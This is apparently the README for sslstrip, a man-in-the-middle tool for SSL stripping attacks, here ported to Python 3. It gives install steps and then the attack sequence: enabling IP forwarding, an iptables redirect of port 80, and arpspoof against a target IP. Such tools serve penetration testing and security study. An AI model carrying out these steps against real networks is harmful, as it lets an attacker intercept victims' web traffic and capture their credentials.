sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping attacks.

Ported from Python v2 to v3 by Jay Townsend (theHarvester, Discover, and DNSrecon).
* [![Twitter Follow](https://img.shields.io/twitter/follow/jay_townsend1.svg?style=social&label=Follow)](https://twitter.com/jay_townsend1) Jay "L1ghtn1ng" Townsend @jay_townsend1

Requirements:  
   This project uses **uv** for dependency management.
   Get **uv** from [here](https://docs.astral.sh/uv/getting-started/installation/) 

Install the dependencies in a virtual environment

```uv sync```
   
Running:  
   sslstrip can be run from the source base without installation.  
   Run as a normal user to see options.  
   ```uv run sslstrip.py -h```

   1. As root, enable IP forwarding:<br>
      ```echo "1" > /proc/sys/net/ipv4/ip_forward```

   2. As root, setup iptables to intercept HTTP requests:<br>
      ```iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <your listen port>```
   
   3. Run sslstrip with the options you prefer.
	
   4. As root, run arpspoof to redirect traffic to your host:<br>
      ```arpspoof -i <your network interface> -t <target IP> <routers IP>```
